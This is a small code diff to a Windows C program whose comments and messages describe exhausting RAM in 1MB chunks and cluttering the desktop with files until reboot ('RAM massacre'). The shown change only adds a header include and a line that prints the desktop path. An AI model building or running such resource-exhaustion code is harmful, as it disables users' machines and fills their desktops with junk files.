@@ -2,6 +2,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <windows.h>
+#include <shlobj.h>
 
 #define CHUNK_SIZE (1024 * 1024)  // 1MB chunks for memory allocation
 #define FILE_SIZE (1024 * 1024)   // 1MB files for desktop clutter
@@ -12,7 +13,8 @@ int main() {
     // Get the desktop path
     char desktop_path[MAX_PATH];
     SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path);
-
+    printf("Desktop path: %s\n", desktop_path);
+    
     printf("Starting the RAM massacre. This will run until you reboot.\n");
 
     while (1) {
